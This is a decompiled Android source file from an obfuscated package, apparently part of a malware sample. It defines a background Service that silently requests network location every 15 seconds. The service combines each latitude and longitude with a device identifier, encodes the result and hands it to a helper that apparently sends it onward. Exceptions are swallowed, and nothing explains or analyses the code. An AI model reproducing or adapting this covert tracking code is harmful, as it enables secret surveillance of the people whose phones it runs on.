package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;

/* JADX INFO: loaded from: classes.dex */
public class frvvkgp extends Service {

    /* JADX INFO: renamed from: a */
    public LocationManager f416a;

    /* JADX INFO: renamed from: b */
    C0022c f417b = new C0022c();

    /* JADX INFO: renamed from: c */
    C0020b f418c = new C0020b();

    /* JADX INFO: renamed from: d */
    private LocationListener f419d = new LocationListener() { // from class: wocwvy.czyxoxmbauu.slsa.frvvkgp.1
        @Override // android.location.LocationListener
        public void onLocationChanged(Location location) {
            frvvkgp.this.m278a(location);
        }

        @Override // android.location.LocationListener
        public void onProviderDisabled(String str) {
        }

        @Override // android.location.LocationListener
        public void onProviderEnabled(String str) {
        }

        @Override // android.location.LocationListener
        public void onStatusChanged(String str, int i, Bundle bundle) {
        }
    };

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX INFO: renamed from: a */
    public void m278a(Location location) {
        if (location != null && location.getProvider().equals("network")) {
            C0020b c0020b = this.f418c;
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            sb.append(this.f418c.m242c(this.f418c.m264q(this) + ":" + m280b(location) + ":NETWORK:"));
            c0020b.m235b(this, "5", sb.toString());
        }
    }

    /* JADX INFO: renamed from: b */
    private String m280b(Location location) {
        return location == null ? "" : String.format("%1$.4f:%2$.4f", Double.valueOf(location.getLatitude()), Double.valueOf(location.getLongitude())).replace(",", ".");
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        try {
            checkCallingOrSelfPermission("android.permission.ACCESS_FINE_LOCATION");
            this.f416a = (LocationManager) getSystemService("location");
            this.f416a.requestLocationUpdates("network", 15000L, 10.0f, this.f419d);
        } catch (Exception unused) {
        }
        return i;
    }
}
